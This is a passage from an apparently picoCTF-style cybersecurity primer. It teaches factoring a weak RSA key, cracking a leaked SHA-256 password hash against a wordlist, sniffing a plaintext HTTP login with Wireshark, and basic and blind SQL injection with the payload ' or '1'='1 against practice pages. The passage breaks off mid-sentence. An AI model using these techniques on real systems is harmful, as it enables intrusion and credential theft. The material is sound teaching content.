                            <div class="listingblock">
                                <div class="content">
                                    <pre
                                        class="pygments highlight"><code data-lang="text"><span></span>openssl x509 -in weak_n_certificate -text -noout</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>In this case,</p>
                            </div>
                            <div class="paragraph">
                                <p>n= 4966306421059967</p>
                            </div>
                            <div class="paragraph">
                                <p>e= 65537</p>
                            </div>
                            <div class="paragraph">
                                <p>As we can see in the output of the command:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 12345 (0x3039)
        Signature Algorithm: md2WithRSAEncryption
        Issuer: CN = PicoCTF
        Validity
            Not Before: Jul  8 07:21:18 2019 GMT
            Not After : Jun 26 17:34:38 2019 GMT
        Subject: OU = PicoCTF, O = PicoCTF, L = PicoCTF, ST = PicoCTF, C = US, CN = PicoCTF
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (53 bit)
                Modulus: 4966306421059967 (0x11a4d45212b17f)
                Exponent: 65537 (0x10001)
    Signature Algorithm: md2WithRSAEncryption
         07:6a:5d:61:32:c1:9e:05:bd:eb:77:f3:aa:fb:bb:83:82:eb:
         9e:a2:93:af:0c:2f:3a:e2:1a:e9:74:6b:9b:82:d8:ef:fe:1a:
         c8:b2:98:7b:16:dc:4c:d8:1e:2b:92:4c:80:78:85:7b:d3:cc:
         b7:d4:72:29:94:22:eb:bb:11:5d:b2:9a:af:7c:6b:cb:b0:2c:
         a7:91:87:ec:63:bd:22:e8:8f:dd:38:0e:a5:e1:0a:bf:35:d9:
         a4:3c:3c:7b:79:da:8e:4f:fc:ca:e2:38:67:45:a7:de:6e:a2:
         6e:71:71:47:f0:09:3e:1b:a0:12:35:15:a1:29:f1:59:25:35:
         a3:e4:2a:32:4c:c2:2e:b4:b5:3d:94:38:93:5e:78:37:ac:35:
         35:06:15:e0:d3:87:a2:d6:3b:c0:7f:45:2b:b6:97:8e:03:a8:
         d4:c9:e0:8b:68:a0:c5:45:ba:ce:9b:7e:71:23:bf:6b:db:cc:
         8e:f2:78:35:50:0c:d3:45:c9:6f:90:e4:6d:6f:c2:cc:c7:0e:
         de:fa:f7:48:9e:d0:46:a9:fe:d3:db:93:cb:9f:f3:32:70:63:
         cf:bc:d5:f2:22:c4:f3:be:f6:3f:31:75:c9:1e:70:2a:a4:8e:
         43:96:ac:33:6d:11:f3:ab:5e:bf:4b:55:8b:bf:38:38:3e:c1:
         25:9a:fd:5f</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Factorizing that n is easy. If you google "integer factorization online", the first
                                    result is this one:</p>
                            </div>
                            <div class="paragraph">
                                <p><a href="https://www.alpertron.com.ar/ECM.HTM"><span
                                            class="underline">https://www.alpertron.com.ar/ECM.HTM</span></a></p>
                            </div>
                            <div class="paragraph">
                                <p>Input the value of n in the text field on that website, and click the button factor.
                                    You will get the following:</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/5image50.png" alt="image" width="624" height="533">
                                </div>
                                <div class="title">Figure 33. Integer factorization online interface</div>
                            </div>
                            <div class="paragraph">
                                <p>That is correct, 67867967 and 73176001 happen to be 'p' and 'q' in the RSA public
                                    key. Having those to values, you are be able to calculate the private key.</p>
                            </div>
                            <div class="paragraph">
                                <p><strong>Challenge</strong>: what is the private key?</p>
                            </div>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_hashing">6.5.3. Hashing</h4>
                        <div class="paragraph">
                            <p>Imagine you want to download a big file from the internet. However, after downloading,
                                you want to check that every bit of the file is correct, and nothing was changed because
                                of a transmission error or a malicious attacker. To do this, you can use a hash, which
                                is a value that you get after applying a hash function to the file, and you obtain a
                                string of fixed length that identifies that file. Whenever you apply the hash function
                                to the file, you will get exactly the same hash, unless the file has been modified. If
                                one bit of the file was changed, you would get a very different hash. So, using a hash
                                we can check the integrity.</p>
                        </div>
                        <div class="paragraph">
                            <p>There are several hash functions used in industry that are considered secure. One that is
                                commonly used, is SHA2, which means "Secure Hashing Algorithm 2", because it is the
                                second version of SHA. Let&#8217;s look at an example. Open the webshell and create a
                                file called "bio.txt" and copy paste the following content (do not include the quotes
                                and make sure there is not break line at the end or beginning):</p>
                        </div>
                        <div class="paragraph">
                            <p>"Charles Babbage KH FRS (26 December 1791  18 October 1871) was an English polymath. A
                                mathematician, philosopher, inventor and mechanical engineer, Babbage originated the
                                concept of a digital programmable computer."</p>
                        </div>
                        <div class="paragraph">
                            <p>Save it, and run the command "sha256sum" like this:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>sha256sum bio.txt</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>As a result, you should get a hex string of 64 characters. In this particular text, you
                                should get:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>338f1cefc564f86ecfc241310d35e31125bb14cff61c080f293be2ef24fb3a69</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>That string is an identification for the information contained in our file. If we make
                                just a little change to the file, it will change completely. For example, create a new
                                file called "bio2.txt" with the same data, but now without the dot at the end:</p>
                        </div>
                        <div class="paragraph">
                            <p>"Charles Babbage KH FRS (26 December 1791  18 October 1871) was an English polymath. A
                                mathematician, philosopher, inventor and mechanical engineer, Babbage originated the
                                concept of a digital programmable computer"</p>
                        </div>
                        <div class="paragraph">
                            <p>Save it, and run the command "sha256sum" like this:</p>
                        </div>
                        <div class="paragraph">
                            <p>sha256sum bio2.txt</p>
                        </div>
                        <div class="paragraph">
                            <p>You should get:</p>
                        </div>
                        <div class="paragraph">
                            <p>3e7e604c81440507f6140becfed1c3510bc49cc4745c938166b9979245215618</p>
                        </div>
                        <div class="paragraph">
                            <p>Note that the hash is very different just because we removed one single dot. Now, add the
                                dot back at the end in the file bio2.txt, and run "sha256sum" on that file. You should
                                get the original hash that we got from "bio.txt", because the information contained in
                                the file is the same.</p>
                        </div>
                        <div class="paragraph">
                            <p>If we store a file, calculate the hash, and keep the hash with us, we could know if the
                                file was modified by recalculating the hash and verifying that it matches with the hash
                                we had. This is a very useful integrity measure. One caveat, is that an attacker should
                                not have access to the place in which the hash is stored, because in that case, the
                                attacker would be able to modify the file, recalculate the hash, and replaced the stored
                                hash, so we would not be able to tell that the file was modified.</p>
                        </div>
                        <div class="paragraph">
                            <p>Hashes are commonly used to store passwords in a database. When a user logs in, the hash
                                of the password is calculated, and it is compared with the hash stored. If they match,
                                we know that the user input the correct password. Note that a fundamental property of
                                hashes is that it is impossible to get the original text from the hash. Because of this,
                                a system administrator would not be able to learn the actual password of users if they
                                have access to the database. In the case of a data breach, when a database is leaked,
                                attackers would not be able to obtain the real password of users.</p>
                        </div>
                        <div class="paragraph">
                            <p>How can a hash be attacked? In the case of passwords, an attacker can create a table that
                                maps several passwords to their hash by calculating the hash of several words, for
                                example all the words in an english dictionary. In that way, if the attacker finds a
                                hash of the password in the database, and the password was a word present in an english
                                dictionary, it could be possible to map it back to the original password by looking for
                                it in the table. However, if a user picked a secure password, this attack would not work
                                because that secure password with complexity, would not be in a dictionary. Note there
                                are lists of commonly used passwords which contain words in several languages and
                                modifications of them, for example, "Hello_12345". A secure password should be random
                                characters to prevent this attack.</p>
                        </div>
                        <div class="paragraph">
                            <p>Challenge: The following hash of a password was leaked from a database, and you know the
                                user did not use a strong password.</p>
                        </div>
                        <div class="paragraph">
                            <p>cd0894152aa5eec36ec79eb2bcb90ca40f056804530f40732b4957a496b23dc8</p>
                        </div>
                        <div class="paragraph">
                            <p>Search on google the list of passwords called "rockyou" and generate the hash to find the
                                password that corresponds to the leaked hash!</p>
                        </div>
                        <div class="paragraph">
                            <p>Hint: you can use python to generate hashes. The hashing algorithm is SHA256.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_the_network">7. The Network</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_4" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>A network is made up of several computers connected. They can be connected through different
                        protocols. A Protocol is a set of rules that allow two computers in a network to send and
                        receive information. That set of rules is essential to understand what information is coming
                        from what source, or how to send information to a particular computer in the network. To sniff
                        traffic in a network, we will be using a tool called Wireshark, which can show the packets
                        transmitted on a network and we can get passwords from insecure connections. But first, we will
                        briefly explain some important things so you roughly understand the composition of a packet and
                        can extract the parts you need.</p>
                </div>
                <div class="paragraph">
                    <p>When you access a browser and visit a web site, the information of the web site is downloaded in
                        packets. Todays Internet is fast, and you might feel that the website appears all at once. But
                        if you download a big file, you can see that it takes some time. This happens because the file
                        is broken down into packets that are received in your computer, and begin to accumulate, until
                        they are all received and conform the whole file when the download is completed. Each packet
                        contains a piece corresponding to each layer. Review the layers here: <a
                            href="#network_layers">Network Layers</a>.</p>
                </div>
                <div class="sect2">
                    <h3 id="_sniffing_and_attack_example">7.1. Sniffing and attack example</h3>
                    <div class="paragraph">
                        <p>In a tool called Wireshark, we can sniff the packets transmitted on a network. The
                            technical term that is used to refer to a tool like Wireshark is sniffer.</p>
                    </div>
                    <div class="paragraph">
                        <p>Go here for instructions on installing Wireshark if you have not already:
                            <a href="#installing_wireshark">Installing Wireshark</a>.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>Once you install and open it you should see a window similar to this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image39.png" alt="image" width="624" height="529">
                        </div>
                        <div class="title">Figure 34. Wireshark GUI</div>
                    </div>
                    <div class="paragraph">
                        <p>That is the list of devices you can sniff. In this case, we want to sniff the network card
                            you are using to connect to the internet. If you are connected to a WiFi, you should select
                            the one that is called WiFi. In case you are connected to the Internet using Ethernet
                            cable, you should select Ethernet. Then, click the start capture button on the upper
                            left side which is circled in the following image:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image40.png" alt="image" width="624" height="529">
                        </div>
                        <div class="title">Figure 35. Wireshark run button</div>
                    </div>
                    <div class="paragraph">
                        <p>The capture now starts. If you have applications running on your computer or have website
                            open in your browser, you will probably see several packets immediately, let the Wireshark
                            window continue to run the packet sniffing. In your browser, navigate to the following link:
                        </p>
                    </div>
                    <div class="paragraph">
                        <p><a href="http://primer.picoctf.org/vuln/web/sign_in.php"
                                class="bare">http://primer.picoctf.org/vuln/web/sign_in.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>You should see the following page:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image41.png" alt="image" width="624" height="529">
                        </div>
                        <div class="title">Figure 36. Sign-in page</div>
                    </div>
                    <div class="paragraph">
                        <p>Now come back to the Wireshark window. What we want to do now is finding the packets that
                            were sent and received in your computer when you accessed the link. If there are too many
                            packets from all the connections on your computer, this task would be too hard task without
                            the help of a Wireshark filter. A Wireshark filter allows you to tell Wireshark that you
                            only want to see some specific packets. You can filter by protocol, IP, strings present in
                            your request, or anything you need that helps you find what you are looking for faster. When
                            we accessed the link on the browser, we did an HTTP request. We can filter HTTP requests, by
                            simply typing http on the filter textfield and pressing enter. The following image shows the
                            results and we circled in red the textfield in which you have to type:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image42.png" alt="image" width="624" height="529">
                        </div>
                        <div class="title">Figure 37. Wireshark HTTP filter</div>
                    </div>
                    <div class="paragraph">
                        <p>Right below the textfield in which you typed is the packet list. We can see two packets. The
                            first one is the request your browser sent to the server asking for the web page, so
                            naturally it has your IP as the source, and the IP of the server as the destination. The
                            second packet is the reply, which now has your IP as the destination and the IP of the
                            server as the source because now the server is the one that is sending the page to you after
                            you request it.</p>
                    </div>
                    <div class="paragraph">
                        <p>In the lower part of the window, we can see the information related to all the layers we
                            explained previously of the currently selected packet. Now, we will send a user and password
                            to the web site. This page in particular does not do anything after you send a password, it
                            just receives it, but the important thing is to note that we can see the password on
                            wireshark when we send it. In the web page, type the following in user and password
                            respectively:</p>
                    </div>
                    <div class="paragraph">
                        <p>picouser</p>
                    </div>
                    <div class="paragraph">
                        <p>picopassword</p>
                    </div>
                    <div class="paragraph">
                        <p>In Wireshark, you should see now two more packets, one in which you send the user and
                            password, and the reply of the server. Note that the reply of the server is the same page,
                            as we said this page does nothing. So far, we have 4 packets, and the third one is the one
                            in which you send the user and password!</p>
                    </div>
                    <div class="paragraph">
                        <p>Click the third packet, and in the lower part of the window where the layers are visible,
                            click Hypertext Transfer Protocol. Note that at the end we can see
                            &amp;password=picopassword</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image43.png" alt="image" width="624" height="529">
                        </div>
                        <div class="title">Figure 38. Sniffed password</div>
                    </div>
                    <div class="paragraph">
                        <p>We just found the password we sent using sniffing. A fundamental thing to note, is that we
                            were able to do that because the website was using HTTP, instead of HTTPS which is
                            encrypted. Encryption prevents us from understanding the contents of a packet.</p>
                    </div>
                    <div class="paragraph">
                        <p>Additionally, we are always able to sniff the network card of our own computer. However, if
                            we want to sniff packets from other devices connected to the same WIFI, we must do
                            additional things because WiFi could be using encryption. We encourage you to use a second
                            device, it can be a smartphone, to access the web page and send a password. Then in your
                            computer use Wireshark to capture the password sent, but first you need to do two things:
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>Enable monitor mode in Wireshark: Stop any packet capture you are doing and open the capture
                            dialog, which is located in the upper part of the window and click optionsChoose Wifi
                            Interface and check monitor as in the following image:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image44.png" alt="image" width="624" height="529">
                        </div>
                        <div class="title">Figure 39. Monitor mode on Wireshark</div>
                    </div>
                    <div class="admonitionblock important">
                        <table>
                            <tr>
                                <td class="icon">
                                    <i class="fa icon-important" title="Important"></i>
                                </td>
                                <td class="content">
                                    When the monitor mode is enabled and you are capturing packets, you would not be
                                    able to navigate the Internet on your computer. To be able to navigate again,
                                    disable monitor mode by unchecking the checkbox.
                                </td>
                            </tr>
                        </table>
                    </div>
                    <div class="paragraph">
                        <p>Decrypt WiFi connection: You can do this only if you have the password for the WiFi you are
                            sniffing. In the following link there is a very good article that explains how to do it:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://wiki.wireshark.org/HowToDecrypt802.11"><span
                                    class="underline">https://wiki.wireshark.org/HowToDecrypt802.11</span></a></p>
                    </div>
                    <div class="paragraph">
                        <p>Note that WIFI encryption is encryption of the datalink layer, which is different to the
                            encryption provided by HTTPS which is in the application layer. Even if you decrypt the WIFI
                            connection, if a website is using HTTPS, you will not be able to see anything from that
                            website on Wireshark.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_infiltrating_in_a_database">8. Infiltrating in a database</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_5" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="sect2">
                    <h3 id="_sql">8.1. SQL</h3>
                    <div class="paragraph">
                        <p>SQL is used to create and manipulate a very common type of databases called relational
                            databases. SQL stands for Structured Query Language. With it you can create tables in a
                            database, store data on them, and run different queries that let you extract and analyze
                            data. We are going to see some examples in a relational database management system (RDBMS)
                            called MySQL. Once you learn the basics of SQL in any RDBMS, it is easy to apply them in
                            others. We are going to see a very quick introduction so you are able to understand the
                            hacks. Let&#8217;s begin.</p>
                    </div>
                    <div class="paragraph">
                        <p>As we said, information is stored in tables. The following is an example of a table that we
                            might call "user":</p>
                    </div>
                    <table class="tableblock frame-all grid-all stretch">
                        <colgroup>
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                        </colgroup>
                        <thead>
                            <tr>
                                <th class="tableblock halign-left valign-top"><strong>Id</strong></th>
                                <th class="tableblock halign-left valign-top"><strong>Name</strong></th>
                                <th class="tableblock halign-left valign-top"><strong>Last Name</strong></th>
                                <th class="tableblock halign-left valign-top"><strong>Phone</strong></th>
                                <th class="tableblock halign-left valign-top"><strong>Password</strong></th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">1</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Jane</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Doe</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">200 111 1111</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">123456</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">2</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Arpit</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Gupta</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">200 111 1111</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">hello</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">3</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Melania</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Clinton</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">201 333 3333</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">password</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div class="admonitionblock note">
                        <table>
                            <tr>
                                <td class="icon">
                                    <i class="fa icon-note" title="Note"></i>
                                </td>
                                <td class="content">
                                    The passwords in this table are just an example. In real life, you should never
                                    store the password directly in the database, as you will learn in the crypto
                                    section. Additionally, you should never use a password like those, they are too
                                    weak.
                                </td>
                            </tr>
                        </table>
                    </div>
                    <div class="paragraph">
                        <p>There are several online tools that you can easily find on Google to learn languages. For
                            example, access the following web site:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://paiza.io/en/projects/new?language=mysql" target="_blank"
                                rel="noopener">https://paiza.io/en/projects/new?language=mysql</a></p>
                    </div>
                    <div class="paragraph">
                        <p>We can execute MySQL statements online. So, let&#8217;s create our table from the previous
                            example on it. First, delete the code present in the editor. You should be seeing something
                            like this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image7.png" alt="image" width="624" height="552">
                        </div>
                        <div class="title">Figure 40. Online MySQL engine</div>
                    </div>
                    <div class="paragraph">
                        <p>Now, you can create the table using the following statement:</p>
                    </div>
                    <div class="paragraph">
                        <p>create table user (id integer, name text, lastname text, phone text, password text);</p>
                    </div>
                    <div class="paragraph">
                        <p>Analyze the statement carefully. This statement creates a table called "user" with five
                            columns. The first column is "id", and has the data type int, which means integer. The other
                            columns are "name", "lastname", "phone", and "password", which are of datatype text. In
                            datatype integer, as you might guess, you can only store integers. In a datatype text, you
                            can store strings. Put that statement in the SQL editor and hit the button "Run". If it was
                            successful, you will see a green bar on top of the editor with the label "success". When you
                            create tables in SQL, they are stored and become available to insert future data on them.
                            However, in this online editor tables just survive in a single run, so in the same script we
                            will have to create the table, insert the data, and query the data.</p>
                    </div>
                    <div class="paragraph">
                        <p>So far we have created the table but it is empty. To insert a row, add the following
                            statement:</p>
                    </div>
                    <div class="paragraph">
                        <p>insert into user (id, name, lastname, phone, password) values (1, 'Jane', 'Doe', '200 111
                            1111', '123456');</p>
                    </div>
                    <div class="paragraph">
                        <p>As you can see, the statement is self explanatory. It will insert each of those values in
                            each column of user conforming a new row. Hit run, and verify it was successful. It should
                            look like this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image16.png" alt="image" width="624" height="46">
                        </div>
                        <div class="title">Figure 41. Create table and insert</div>
                    </div>
                    <div class="paragraph">
                        <p>Now, add the following line that will query the data you have inserted so far:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user;</p>
                    </div>
                    <div class="paragraph">
                        <p>The * means that you want to see the content of all the columns. Hit Run.</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image12.png" alt="image" width="624" height="146">
                        </div>
                        <div class="title">Figure 42. Query data by running select sentence</div>
                    </div>
                    <div class="paragraph">
                        <p>You can see the results at the end. Now insert the two rows missing to conform our 3 row
                            table:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image24.png" alt="image" width="624" height="177">
                        </div>
                        <div class="title">Figure 43. Inserting the rows missing</div>
                    </div>
                    <div class="paragraph">
                        <p>If you are interested in returning only some particular columns, you can list them instead of
                            using the *. For example, let&#8217;s return only the name and lastname:</p>
                    </div>
                    <div class="paragraph">
                        <p>select name, lastname from user;</p>
                    </div>
                    <div class="paragraph">
                        <p>You will see:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image10.png" alt="image" width="624" height="154">
                        </div>
                        <div class="title">Figure 44. Querying only full name</div>
                    </div>
                    <div class="paragraph">
                        <p>We can make our query more granular if we add a "where" clause like this:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user <strong>where id=2</strong>;</p>
                    </div>
                    <div class="paragraph">
                        <p>Look at the query carefully. We already know that the * means we want to see the content of
                            every column. In the 'where' clause we restrict which rows we want to return. What row do
                            you think is going to return that query?</p>
                    </div>
                    <div class="paragraph">
                        <p>If you thought about this row:</p>
                    </div>
                    <table class="tableblock frame-all grid-all stretch">
                        <colgroup>
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                        </colgroup>
                        <tbody>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">2</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Arpit</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Gupta</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">200 111 1111</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">hello</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div class="paragraph">
                        <p>You were right. That is because that row is the one with the value of 2 in its id. You could
                            filter by any other field. If you are filtering a field of type text, you have to enclose
                            the value in single quotes. Remove the previous select statement, and add:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user where phone='200 111 1111' ;</p>
                    </div>
                    <div class="paragraph">
                        <p>You should be seeing the following:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image21.png" alt="image" width="624" height="60">
                        </div>
                        <div class="title">Figure 45. Filtering by a specific phone number</div>
                    </div>
                    <div class="paragraph">
                        <p>Run it. If you look at the rows inserted. 'Jone Doe' had the same phone number as 'Arpit
                            Gupta'. The select statement should return 2 rows like this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image9.png" alt="image" width="624" height="174">
                        </div>
                        <div class="title">Figure 46. Result of filtering by a specific phone number</div>
                    </div>
                    <div class="paragraph">
                        <p>We can also filter by two fields in the same query using the logical operator 'and' in the
                            following manner:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user where phone='200 111 1111' and name='Jane';</p>
                    </div>
                    <div class="paragraph">
                        <p>After the "where" clause, you can put several boolean expressions. As you learned previously
                            in the programming chapter, when you use "and" it means that both expressions have to be
                            true so the expression is true. The query should return this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image3.png" alt="image" width="624" height="172">
                        </div>
                        <div class="title">Figure 47. Result of filtering by a specific phone number and name</div>
                    </div>
                    <div class="paragraph">
                        <p>Now, add another 'and' operator, to try to filter using a name that does not exist in the
                            table:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user where phone='200 111 1111' and name='Jane' and name='Mario';</p>
                    </div>
                    <div class="paragraph">
                        <p>The query should return no results, because 'Mario' does not exist in our database:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image29.png" alt="image" width="624" height="124">
                        </div>
                        <div class="title">Figure 48. Filtering by a name that is not present in the data we inserted
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, as an experiment add another filter, but this time use "or" instead of "and". For
                            example, run:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user where phone='200 111 1111' and name='Mario' or name='Arpit';</p>
                    </div>
                    <div class="paragraph">
                        <p>You will see:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image19.png" alt="image" width="624" height="138">
                        </div>
                        <div class="title">Figure 49. Filtering by two different names using OR</div>
                    </div>
                    <div class="paragraph">
                        <p>What happened here? Analyze the query carefully. You know there is no one called Mario in our
                            table. Why in the world does the query return a row? If you think about it, any expression,
                            no matter how long it is, if results in False, but then you do "or" with something that is
                            true, it will be true. For example:</p>
                    </div>
                    <div class="paragraph">
                        <p>1=2 and 3=2 and 47=1 or 1=1</p>
                    </div>
                    <div class="paragraph">
                        <p>Will be true, because (1=2 and 3=5 and 45=1) is false, but (1=1) is true. This is fundamental
                            for the basic SQL injection attack.</p>
                    </div>
                    <div class="paragraph">
                        <p>Try the following:</p>
                    </div>
                    <div class="paragraph">
                        <p>select * from user where phone='200 111 1111' and name='Mario' <strong>or 1=1</strong>;</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image20.png" alt="image" width="624" height="148">
                        </div>
                        <div class="title">Figure 50. Result of filtering by something specific but using OR with
                            something that is always true</div>
                    </div>
                    <div class="paragraph">
                        <p>You just returned all the results! That happens, as you might guess, because "1=1" is always
                            true. As an exercise, create a new table with new data and create new queries.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_basic_sql_injection">8.2. Basic SQL injection</h3>
                    <div class="paragraph">
                        <p>The objective of the basic SQL injection we are learning is to try to inject an "or"
                            expression that is always true. In that way the server code constructs a query using the
                            user input that deceives the program into it returning the whole table. That happens when a
                            program is concatenating strings to construct a query in the server code. The following is
                            an example in PHP:</p>
                    </div>
                    <div class="paragraph">
                        <p>"<span class="lime">SELECT * FROM user where name='</span>".$name.""<span class="lime">' and
                                password='</span>".$password.""<span class="lime">';</span>"</p>
                    </div>
                    <div class="paragraph">
                        <p>The green part of the query will be concatenated with the value of the variables to form the
                            final query. Let&#8217;s suppose that $name is equal to "samuel", and $password is equal to
                            "hello", the query would result in</p>
                    </div>
                    <div class="paragraph">
                        <p>SELECT * FROM user where name='samuel' and password='hello';</p>
                    </div>
                    <div class="paragraph">
                        <p>What would happen if the password contains a single quote? That might break the syntax of the
                            SQL query. Even worse, it could be used to inject your own sql. For example, if the value of
                            $password is:</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>' or '1'='1</strong></p>
                    </div>
                    <div class="paragraph">
                        <p>The resultant query would be:</p>
                    </div>
                    <div class="paragraph">
                        <p><span class="lime">SELECT * FROM user where name='samuel' and password='</span>' <strong>or
                                '1'='1</strong><span class="lime">';</span></p>
                    </div>
                    <div class="paragraph">
                        <p>Which is a perfectly valid query that will return the whole table. Use what you just learned
                            here to return all the users:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/basicsql.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/basicsql.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>This kind of vulnerability is rarely present in applications. One that is more common, is the
                            blind sql injection.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_blind_sql_injection">8.3. Blind SQL injection</h3>
                    <div class="paragraph">
                        <p>In this kind of vulnerability, the application does not return all the data to you. However,
                            it is enough that the application shows an error message saying that no data was found or
                            that an error has occurred, to figure out the content we are looking for.</p>
                    </div>
                    <div class="paragraph">
                        <p>To illustrate this, we are going to attack the following page:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/blindsql.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/blindsql.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>If we input our previous injection in the password field:</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>' or '1'='1</strong></p>
                    </div>
                    <div class="paragraph">
                        <p>We will see that the application found something and shows the message "REGISTER FOUND":</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image28.png" alt="image" width="624" height="205">
                        </div>
                        <div class="title">Figure 51. Blind SQL injection</div>
                    </div>
                    <div class="paragraph">
                        <p>Internally, the injection deceives the application into returning records, but the
                            application did not show us those records. That&#8217;s why it is called Blind SQL
                            injection. We can inject SQL, but we cannot see the result!</p>
                    </div>
                    <div class="paragraph">
                        <p>What can we do about this? We will try to inject a SQL to guess one character of a field at a
                            time. Suppose we want to guess the first character of the password. If we don&#8217;t guess
                            it, the application will return "NOTHING FOUND". If we guess it, it will return "REGISTER
                            FOUND".</p>
                    </div>
                    <div class="paragraph">
                        <p>Note, this is fundamental to be able to guess only one character at a time. Trying to guess a
                            whole string at the same time, is much harder. Suppose a word is made up by a combination of
                            the 26 characters of the alphabet. To guess only the first letter, we only have to try 26
                            values. However, if we try to guess the whole word, is much more complicated. To illustrate
                            this, suppose we have a word of two letters. If we can guess one at a time, we will need at
                            most 26 trials for the first one, and 26 trials for the second one, for a total of 52
                            trials. On the other hand, if we try to guess both letters at a time, we will need 26*26
